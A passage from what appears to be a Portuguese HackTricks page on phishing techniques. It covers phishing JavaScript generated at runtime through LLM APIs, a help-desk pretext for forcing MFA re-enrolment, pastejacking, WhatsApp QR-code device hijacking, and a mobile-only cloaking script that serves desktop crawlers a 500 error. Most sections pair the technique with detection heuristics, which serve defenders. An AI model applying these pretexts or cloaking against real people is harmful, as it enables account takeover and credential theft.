- O tráfego passa por domínios conhecidos de LLMs ou proxies de CDN confiáveis; às vezes, usa WebSockets para se conectar a um backend.
- Não há payload estático; o JavaScript malicioso só existe após a renderização.
- Gerações não determinísticas produzem stealers **únicos** por sessão.

**Ideias para detecção**
- Execute sandboxes com JavaScript habilitado; sinalize `eval` em tempo de execução e criação dinâmica de scripts com origem em respostas de LLMs.
- Procure por requisições POST do front-end para APIs de LLMs seguidas imediatamente por `eval`/`Function` no texto retornado.
- Gere alertas para domínios de LLMs não autorizados no tráfego do cliente, seguidos por envios de credenciais via POST.

---

## MFA Fatigue / Push Bombing – Variante de redefinição forçada
Além do push bombing clássico, os operadores simplesmente **forçam um novo registro de MFA** durante a ligação para o help desk, invalidando o token existente do usuário. Qualquer solicitação de login subsequente parece legítima para a vítima.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitore eventos do AzureAD/AWS/Okta em que **`deleteMFA` + `addMFA`** ocorram **em poucos minutos e a partir do mesmo IP**.



## Clipboard Hijacking / Pastejacking

Os atacantes podem copiar silenciosamente comandos maliciosos para a área de transferência da vítima a partir de uma página comprometida ou com typosquatting e, em seguida, induzir o usuário a colá-los dentro de **Win + R**, **Win + X** ou de uma janela de terminal, executando código arbitrário sem nenhum download ou anexo.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing móvel e distribuição de apps maliciosos (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Sequestro de dispositivo vinculado do WhatsApp por engenharia social com QR code
* Uma página-isca (por exemplo, um “canal” falso de ministério/CERT) exibe um QR code do WhatsApp Web/Desktop e instrui a vítima a escaneá-lo, adicionando silenciosamente o atacante como um **dispositivo vinculado**.<sup>[[12]](#references)</sup>
* O atacante obtém imediatamente visibilidade das conversas e dos contatos até que a sessão seja removida. As vítimas podem ver mais tarde uma notificação de “novo dispositivo vinculado”; os defensores podem procurar eventos inesperados de vinculação de dispositivos logo após visitas a páginas com QR codes não confiáveis.

### Phishing condicionado a dispositivos móveis para evitar crawlers/sandboxes
Os operadores cada vez mais condicionam seus fluxos de phishing a uma simples verificação do dispositivo para que crawlers de desktop nunca cheguem às páginas finais. Um padrão comum é um pequeno script que verifica se o DOM é compatível com toque e envia o resultado a um endpoint do servidor; clientes que não são móveis recebem HTTP 500 (ou uma página em branco), enquanto os usuários móveis recebem o fluxo completo.<sup>[[7]](#references)</sup>

Trecho mínimo do cliente (lógica típica):

```html
<script src="/static/detect_device.js"></script>
```

Lógica de `detect_device.js` (simplificada):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportamento do servidor observado com frequência:
- Define um cookie de sessão durante o primeiro carregamento.
- Aceita `POST /detect {"is_mobile":true|false}`.
- Retorna 500 (ou um placeholder) para GETs subsequentes quando `is_mobile=false`; só serve phishing se for `true`.

Heurísticas de busca e detecção:
- Consulta do urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria da Web: sequência `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para dispositivos não móveis; caminhos legítimos de vítimas em dispositivos móveis retornam 200, seguidos de HTML/JS.
- Bloqueie ou examine páginas que condicionam o conteúdo exclusivamente a `ontouchstart` ou a verificações semelhantes do dispositivo.

Dicas de defesa:
- Execute crawlers com fingerprints semelhantes aos de dispositivos móveis e JS habilitado para revelar conteúdo oculto.
- Gere alertas para respostas 500 suspeitas após `POST /detect` em domínios recém-registrados.

## References

- [1] [Gerando variações de domínio usadas em phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Encontrando phishing: ferramentas e técnicas (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Roubar credenciais e contornar 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Como instalar e configurar DKIM com Postfix no Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Relatório Global de Resposta a Incidentes Unit 42 de 2025 – Edição sobre engenharia social](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infraestrutura de phishing restrita a dispositivos móveis e heurísticas (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [A próxima fronteira dos ataques de montagem em tempo de execução: aproveitando LLMs para gerar JavaScript de phishing em tempo real](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonação, sequestro de cliques e TDS: por dentro de um ecossistema de distribuição de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Sequestro do tráfego para windows.com da Microsoft usando bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amor? Na verdade: aplicativo de namoro falso usado como isca em campanha direcionada de spyware no Paquistão](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs e amostras do ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Expondo a AdFection: como a Discover-Tech transformou anúncios direcionados em um canal para spyware mercenário de clique zero](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
